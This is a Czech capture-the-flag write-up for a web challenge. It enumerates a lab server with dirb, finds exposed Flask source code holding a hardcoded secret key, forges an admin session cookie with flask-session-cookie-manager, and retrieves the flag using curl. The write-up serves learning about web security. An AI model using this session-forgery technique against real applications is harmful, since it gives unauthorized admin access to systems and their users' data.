# Social Network

## Zadání

```
Hi Expert,

the application running on http://78.128.216.18:65181 was probably some kind of social network. Get access to the system and export any valuable data.

Good Luck!

Hint: If you get admin access, exporting will be more fun.
Hint: It will be useful to find and download the application.
```

## Řešení

* Na stránce http://78.128.216.18:65181/ je přihlašovací formulář
* Při pokusu o přihlášení jako `admin` vypíše: `invalid credentials`
* Stránka nastavuje cookie: `session=eyJ1c2VybmFtZSI6bnVsbH0.YXluwA.bftHbAh9kuKOgu2OGi2-clPshHI`
* Cookie je v base64 a první část (před [tečkou](https://www.ceskoockuje.cz/)) obsahuje data `{"username":null}`, dále ale cookie obsahuje podpis, takže `{"username":"admin"}` nelze jednoduše podvrhnout
* Podle druhého hintu je tak třeba hledat zdrojový kód aplikace - například pomocí `dirb`:

```
dirb http://78.128.216.18:65181/

---- Scanning URL: http://78.128.216.18:65181/ ----
+ http://78.128.216.18:65181/login (CODE:405|SIZE:178)
+ http://78.128.216.18:65181/logout (CODE:302|SIZE:208)
+ http://78.128.216.18:65181/server-status (CODE:403|SIZE:281)
==> DIRECTORY: http://78.128.216.18:65181/web/
```

* Zdrojový kód je tedy v http://78.128.216.18:65181/web/, kde je zapnutý directory listing
* Jedná se o webovou aplikaci napsanou v python-flask
* Důležitý je kód v http://78.128.216.18:65181/web/app.py

```python
"""my superprofile app"""

import os

from flask import flash, Flask, redirect, render_template, request, session, url_for


FLAG = os.environ.get('FLAG', 'admin')
USERS = {'admin': FLAG}

app = Flask(__name__)
app.secret_key = 'f3cfe9ed8fae309f02079dbf'


@app.before_request
def before_request():
    """before request handler"""

    if 'username' not in session:
        session['username'] = None


@app.route('/')
def index():
    """login route"""

    return render_template('index.html', username=session.get('username'), data=FLAG)


@app.route('/login', methods=['POST'])
def login():
    """login route"""

    if request.method == 'POST':
        if USERS.get(request.form.get('username')) == request.form.get('password'):
            session['username'] = request.form['username']
        else:
            flash('invalid credentials')

    return redirect(url_for('index'))


@app.route('/logout')
def logout():
    """logout route"""

    session.pop('username', None)
    return redirect(url_for('index'))
```

* Známe tedy `secret_key` a tak není problém vygenerovat správný podpis cookie - například pomocí https://github.com/noraj/flask-session-cookie-manager

```
python3 flask_session_cookie_manager3.py encode -s f3cfe9ed8fae309f02079dbf -t '{"username":"admin"}'
eyJ1c2VybmFtZSI6ImFkbWluIn0.YXlykw.JtzMrVmwK8HoE9okn2-xxQhk7uQ
```

## Výpis vlajky

```
curl -H "Cookie:session=eyJ1c2VybmFtZSI6ImFkbWluIn0.YXlykw.JtzMrVmwK8HoE9okn2-xxQhk7uQ" http://78.128.216.18:65181/

<html>
<body>
<h1>My superprofile</h1>
	<a href="/logout">logout</a>
	<p>
	<pre>FLAG{r4Kt-Ws0C-J3b3-2EJg}</pre>
</body>
</html>
```
